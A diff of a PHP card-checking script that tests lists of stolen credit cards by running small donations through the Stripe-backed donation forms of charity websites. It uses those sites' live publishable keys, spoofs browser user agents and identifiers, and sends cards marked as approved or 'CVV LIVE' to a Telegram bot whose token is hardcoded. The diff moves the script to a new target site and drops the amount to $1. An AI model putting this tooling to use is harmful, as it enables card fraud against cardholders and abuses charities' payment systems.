@@ -18,7 +18,7 @@ function payment($card,$ccNo,$month,$year,$cvv){
 	    	];
 	    }
     }
-	$data = array(
+$data = array(
     'type' => 'card',
     'card' => array(
         'number' => $ccNo,
@@ -30,10 +30,10 @@ function payment($card,$ccNo,$month,$year,$cvv){
     'muid' => 'NA',
     'sid' => 'NA',
     'pasted_fields' => 'number',
-    'payment_user_agent' => 'stripe.js/93fe8dba76;+stripe-js-v3/93fe8dba76;+card-element',
-    'referrer' => 'https://www.eastsideparkwayscoalition.com/',
+    'payment_user_agent' => 'stripe.js/d182db0e09; stripe-js-v3/d182db0e09; card-element',
+    'referrer' => 'https://www.strolloxcommunity.org.uk',
     'time_on_page' => 200441,
-    'key' => 'pk_live_51Or9GoHTj0GS6BMFF5n0J6RWTywSnKihJGHNqEgDCtja4t6Cgk5NWedhYEpjYDHhvvuB8ortgOAb6Q1pVq9a4gXh00ONrrOsHF'
+    'key' => 'pk_live_51NpUfeFnpXeLM6Ynnp8CNIyiWlZFM7s6NCvRbr2dMquOAFSgDMOcSNtEFhhRyfEwvLyKIpW8vG8GO92mIZ7pcKfs00y6Sh2yEw'
 	);
 	$url = "https://api.stripe.com/v1/payment_methods";
 
@@ -74,7 +74,7 @@ function payment($card,$ccNo,$month,$year,$cvv){
 	}	
 }
 function donate($card,$paymentId,$name,$email){
-	$formData = "data=__fluent_form_embded_post_id%3D1306%26_fluentform_9_fluentformnonce%3D0c34caea96%26_wp_http_referer%3D%252Fdonate-to-espc%252F%26names%255Bfirst_name%255D%3D$name%26names%255Blast_name%255D%3D$name%26email%3D$email%26address_1%255Baddress_line_1%255D%3D125%2520Klee%2520Lane%26address_1%255Baddress_line_2%255D%3D%26address_1%255Bcity%255D%3DNew%2520York%26address_1%255Bstate%255D%3DNY%26address_1%255Bzip%255D%3D10080%26payment_input%3D%252420%26payment_method%3Dstripe%26checkbox%255B%255D%3D%26__stripe_payment_method_id%3D$paymentId&action=fluentform_submit&form_id=9";
+	$formData = "data=__fluent_form_embded_post_id%3D108%26_fluentform_3_fluentformnonce%3D5dbbc40800%26_wp_http_referer%3D%252Fdonate%252F%26names%255Bfirst_name%255D%3D$name%26names%255Blast_name%255D%3D$name%26input_text_2%3D4132004701%26email%3D$email%26address1%255Baddress_line_1%255D%3D125%2520Klee%2520Lane%26address1%255Baddress_line_2%255D%3D%26address1%255Bcity%255D%3DNew%2520York%26address1%255Bstate%255D%3DNY%26address1%255Bzip%255D%3D10080%26address1%255Bcountry%255D%3DUS%26payment_input_1%3D1%26payment_input_1_custom_0%3D5%26payment_input_1_custom_1%3D1%26payment_method%3Dstripe%26__stripe_payment_method_id%3D$paymentId&action=fluentform_submit&form_id=3";
 	$userAgents = [
 	    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
 	    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
@@ -84,18 +84,17 @@ function donate($card,$paymentId,$name,$email){
 	];
 
 	$randomUserAgent = $userAgents[array_rand($userAgents)];
-	//add your proxy here
 	// $username = "";
 	// $password = "";
 	// $PROXYSCRAPE_PORT = ;
 	// $PROXYSCRAPE_HOSTNAME = '';
 	$ch = curl_init();
-	curl_setopt($ch, CURLOPT_URL, 'https://www.eastsideparkwayscoalition.com/wp-admin/admin-ajax.php?t=1721825471378');
+	curl_setopt($ch, CURLOPT_URL, 'https://www.strolloxcommunity.org.uk/wp-admin/admin-ajax.php?t=1722859739767');
 	curl_setopt($ch, CURLOPT_POST, true);
 	curl_setopt($ch, CURLOPT_POSTFIELDS, $formData);
 	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-	    'Referer: https://intercleft.com/donate/',
+	    'Referer: https://www.strolloxcommunity.org.uk/donate/',
 	    'User-Agent: ' . $randomUserAgent,
 	    'X-Requested-With: XMLHttpRequest'
 	));
@@ -104,7 +103,6 @@ function donate($card,$paymentId,$name,$email){
 	// curl_setopt($ch, CURLOPT_PROXY, $PROXYSCRAPE_HOSTNAME);
 	// curl_setopt($ch, CURLOPT_PROXYUSERPWD, $username.':'.$password);
 	$response = curl_exec($ch);
-	echo $response;
 	if (curl_errno($ch)) {
 	    return [
     		false,
@@ -114,10 +112,10 @@ function donate($card,$paymentId,$name,$email){
 	    $data = json_decode($response,true);
 	    if(isset($data['errors'])){
 	    	if(isset($data['errors']) && strpos($data['errors'], "insufficient funds") === 0){
-		    	sendTele("$card - Insufficient Funds 20$");
+		    	sendTele("$card - Insufficient Funds 1$");
 		    	return [
 		    		true,
-		    		"$card - Insufficient Funds 20$ \n"
+		    		"$card - Insufficient Funds 1$ \n"
 		    	];
 		    }else{
 		    	$errors = $data['errors'];
@@ -128,16 +126,16 @@ function donate($card,$paymentId,$name,$email){
 		    }
 	    }elseif(isset($data['success'])){
 	    	if(strpos($data['data']['message'],"Verifying strong customer authentication. Please wait...") === 0){
-	    		sendTele("$card - CVV LIVE 20$ (Request 3D Secure)");
+	    		sendTele("$card - CVV LIVE 1$ (Request 3D Secure)");
 	    		return [
 	    		true,
-	    		"$card - CVV LIVE 20$ (Request 3D Secure) \n"
+	    		"$card - CVV LIVE 1$ (Request 3D Secure) \n"
 	    	];
 	    	}else{
-	    		sendTele("$card - Approved 20$");
+	    		sendTele("$card - Approved 1$");
 	    		return [
 	    		true,
-	    		"$card - Approved 20$ \n"
+	    		"$card - Approved 1$ \n"
 	    	];
 	    	}
 	    }
@@ -182,13 +180,33 @@ function sendTele($message){
 	$url = $GLOBALS['endpoint'] . "/sendMessage?chat_id=1668286923&text=" . urlencode($message);
     file_get_contents($url);
 }
+function generateIdentifier($type) {
+    $hex = function($length) {
+        $hex = '';
+        for ($i = 0; $i < $length; $i++) {
+            $hex .= dechex(mt_rand(0, 15));
+        }
+        return $hex;
+    };
 
+    switch ($type) {
+        case 'guid':
+            return $hex(8) . '-' . $hex(4) . '-' . $hex(4) . '-' . $hex(4) . '-' . $hex(12);
+        case 'muid':
+            return $hex(8) . '-' . $hex(4) . '-' . $hex(4) . '-' . $hex(12);
+        case 'sid':
+            return $hex(8) . '-' . $hex(4) . '-' . $hex(4) . '-' . $hex(12);
+        default:
+            return null; // or throw an exception if the type is unknown
+    }
+}
 $file = "combo.txt";
 $cardList = file_get_contents($file);
+
 if ($cardList === false) {
     die("Error: Unable to read card list file. \n");
 }
-$botToken = "7201459757:AAE7CCAlBLCQ1ouzRva6tNBf3w2WMxoLXT8"; //don't modify here anything and don't do anything as it is public data
+$botToken = "7201459757:AAE7CCAlBLCQ1ouzRva6tNBf3w2WMxoLXT8";
 $endpoint = "https://api.telegram.org/bot".$botToken;
 $cards = array_map('trim',explode("\n", $cardList));
 foreach ($cards as $card) {
@@ -197,7 +215,10 @@ foreach ($cards as $card) {
     $month = $ecard[1];
     $year = $ecard[2];
     $cvv = $ecard[3];
-	$paymentDetils = payment($card,$ccNo,$month,$year,$cvv);
+    $guid = generateIdentifier('guid');
+    $muid = generateIdentifier('muid');
+    $sid = generateIdentifier('sid');
+	$paymentDetils = payment($card,$ccNo,$month,$year,$cvv,$guid,$muid,$sid);
 	$randominfo = random();
 	if($paymentDetils[0] !== false){
 		if($randominfo[0] !== false){
